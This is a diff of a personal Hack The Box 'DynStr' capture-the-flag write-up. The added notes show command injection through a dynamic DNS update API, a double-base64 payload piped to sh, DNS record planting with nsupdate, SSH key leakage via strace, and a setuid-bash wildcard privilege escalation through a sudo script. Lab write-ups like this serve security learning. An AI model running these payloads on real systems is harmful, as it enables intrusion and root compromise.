@@ -9,7 +9,23 @@ Goals:
 - VS Code / Codium and Snyk plugin is must to have!
 - DNS general
 Learnt:
-- Automating with the power of x[ar](https://www.youtube.com/watch?v=b9VrnCMhJsQ)gs 
+- Automating with the power of x[ar](https://www.youtube.com/watch?v=b9VrnCMhJsQ)gs '
+- Some cool bash 
+```bash
+# A nice way to write bash one-line functions that just do one thing well
+indent() { sed 's/^/    /'; }
+
+# Check version and files
+if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 43
+fi
+
+if [[ ! -f .version ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 42
+fi
+```
 Beyond Root:
 - Azure DNS
 - Azure Backup
@@ -103,8 +119,8 @@ Test what happens if it does not - changed the password
 Consider implementation:
 - `hostname=nvm.no-ip.htb&myip=10.10.14.70` is pass to a program that then updates the DNS on the DynStr machine
 
-```
-curl http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=nvm.no-ip.htb&myip=10.10.14.70 --proxy http://127.0.0.1:8080
+```bash
+curl 'http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=nvm.no-ip.htb&myip=10.10.14.70' --proxy http://127.0.0.1:8080
 ```
 
 ## Exploit
@@ -252,6 +268,11 @@ print(dotless_ipv4)
 print(dotless_ipv6)
 ```
 
+The onliner version of dotless IP creation
+```bash
+python3 -c 'import ipaddress;print(int(ipaddress.ip_address("10.10.14.154")))'
+```
+
 Double base64 decode
 ```bash
 $(echo+YzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRZNE5ETXhNVGMwTHpVeklEQStKakVL+|base64+-d|base64+-d|sh)
@@ -261,19 +282,22 @@ $(echo+YzJnZ0xXa2dQaVlnTDJSbGRpOTBZM0F2TVRZNE5ETXhNVGMwTHpVeklEQStKakVL+|base64+
 Lesson 
 - read the errors what is it doing 
 - remember nightmare dots, slashes, quotes, etc - need a good meumonic
-![](hurray.png)
+![1080](hurray.png)
 ## Foothold
 
 ![](bindmgrandynausers.png)
 
+There is internal DNS
 ![](127-0-1-1.png)
 
 ![](passwd.png)
 
+
+
+Support-case is custom directory
 ![](homedirectories.png)
 
-support case
-
+ssh id_rsa configured, but cannot read the key
 ![](nosshkey.png)
 
 ![](unamea.png)
@@ -283,13 +307,12 @@ support case
 ![](butroutetable.png)
 nothing in resolv.conf
 
-
 Exfiled the `/home/bindmgr/support-case-C62796521` directory
 ![](exfilthecasework.png)
 
 ![](commout.png)
 
-The `strace` leakes the SSH private key, which also very handlerly is perfectly formatted for echo
+The `strace` leaks the SSH private key, which also very handlerly is perfectly formatted for echo
 ![](sshidainthestrace.png)
 
 Exfil the script broke so I went back to get that as I still need the password
@@ -306,15 +329,94 @@ Re exfiltrated the .script and tried to find the bindmgr-release.zip, but no ret
 
 Cannot seem to find the `[]char`
 ![](samecharbuffers.png)
-
+```
 nomem.local 
 192.168.178.27 tsftp.infra.dyna.htb
-
+```
 ![](noresolutiononinfra.png)
+I tried 
 
-Check for passwords in the likely places. It is almost certainly in the hex of strace as we need a password to create the key.
-## Privilege Escalation
+Checked for passwords in the likely places. It is almost certainly in the hex of strace as we need a password to create the key. I know it is there, but at this point given time I am not doing to learn anything by guess the encoding. I tried `phind` and it is states that is possibly hex, but it does not seem like hex. I moved forward with xct writeup to complete the machine have exhausted I what I think I can actually get out of this machine now.
 
+At this point I was too concern about extract the information from the exfiled files to worry about how to use it.
+![](xctpointoutthehostkey.png)
+
+xct can just log in and I was confused, but then it is another issue with focusing hard on doing sometime that I except rather than stepping back an understanding the context. If I had found the domain name in authorized_key entry then this id_rsa is only valid for a specific domain 
+
+```bash
+echo "local 127.0.0.1\nupdate add nvm.infra.dyna.htb 30 IN A 10.10.14.154\nsend\n" | /usr/bin/nsupdate -k /etc/bind/infra.key
+```
+
+I add quit to keep the shell
+```bash
+www-data@dynstr:/etc/bind$ nsupdate -k infra.key 
+> server 127.0.0.1
+> zone dyna.htb
+> update add nvm.infra.dyna.htb 30 IN A 10.10.14.154
+> send
+> zone 10.in-addr.arpa
+> update add 154.14.10.10.in-addr.arpa 30 IN PTR nvm.infra.dyna.htb
+> send
+> quit
+```
+
+[0xDF notes](https://0xdf.gitlab.io/2021/10/16/htb-dynstr.html#testing-api)
+>*TIL authorized_keys files can contain more than just public keys.  
+> You can control source hosts of each key, limit the port forwarding, execute commands upon login.  
+> In 20+ years of working on Unix/Linux systems, I've never seen this used. [https://t.co/XZeG9s6srV](https://t.co/XZeG9s6srV) [pic.twitter.com/WZ9M3iUKXQ](https://t.co/WZ9M3iUKXQ)
+> 
+> — Florian Roth (@cyb3rops) [May 19, 2021](https://twitter.com/cyb3rops/status/1395009709787258882?ref_src=twsrc%5Etfw)*
+
+Also that we can replay stack strace .script files
+```bash
+scriptreplay [.timing file] [.script file]
+```
+
+![](hurraydnshurray.png)
+
+
+## Privilege Escalation Bindmgr to Root
+
+We can `nopasswd` sudo a script 
+![](ascriptwithsudo.png)
+
+the Script:
+![](bindmgrscript.png)
+1. Checks versioning of a .version file
+	- It checks .version to a .version in to a `$BINDMGR_DIR/.version`
+2. Create config file that includes all files from named.bindmgr.
+3. Stage new version of configuration files.
+4. Check generated configuration with named-checkconf.
+
+
+We cannot modify
+![](cannotmodify.png)
+This a binary 
+![](named-checkconf.png)
+The man page
+![](manpagefornamed-checkconf.png)
+
+I realised I am just really afraid on jsut running things
+![](remindedtotestthings.png)
+
+```bash
+--preserve # preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, all
+```
+
+I feel happy that I spotted the wildcard, but I did forget to add the addition captions when I first tried screenshotting the script, which chad the first half explained to myself  
+```bash
+mount| grep shm
+cd /dev/shm
+echo 100 > .version
+cp /bin/bash .
+chmod 4777 bash
+touch -- --preserve=mode
+sudo bindmgr.sh 
+ls -la /etc/bind/named.bindmgr/
+```
+
+So following along with 0xdf to get this done.
+![](finallyaftermonths.png)
 ## Beyond Root
 
 Get VS Codium for the zero telemetry on Kali
